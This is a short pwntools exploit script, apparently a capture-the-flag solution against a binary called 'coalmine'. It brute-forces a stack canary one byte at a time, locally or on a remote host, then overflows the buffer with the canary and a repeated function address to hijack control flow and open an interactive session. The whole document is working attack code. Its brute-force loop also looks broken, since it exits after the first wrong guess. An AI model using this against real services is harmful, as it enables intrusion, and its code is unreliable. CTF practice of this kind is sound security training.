#!/usr/bin/python2

from pwn import *
import sys
import string
import time

context.log_level = 'DEBUG'
context.terminal = ['/usr/bin/termite', '-e']

e = ELF('./coalmine')
def getp():
    if len(sys.argv) == 3:
        p = remote(sys.argv[1], int(sys.argv[2]))
    else:
        p = process('./coalmine')
        gdb.attach(p, 'b *main+72\nc\n')
    return p

birdy = ''
for k in range(8):
    for c in string.ascii_letters:
        p = getp()
        p.sendlineafter('>', 'A'*(32+k) + c)
        if '***' not in p.recvline():
            p.close()
            birdy += c
            break
        p.close()

        p.interactive()
        exit(1)
    else:
        exit(1)

p = getp()
p.sendlineafter('>', 'A'*32 + birdy + p32(e.sym.tweet_tweet)*10)
p.interactive()
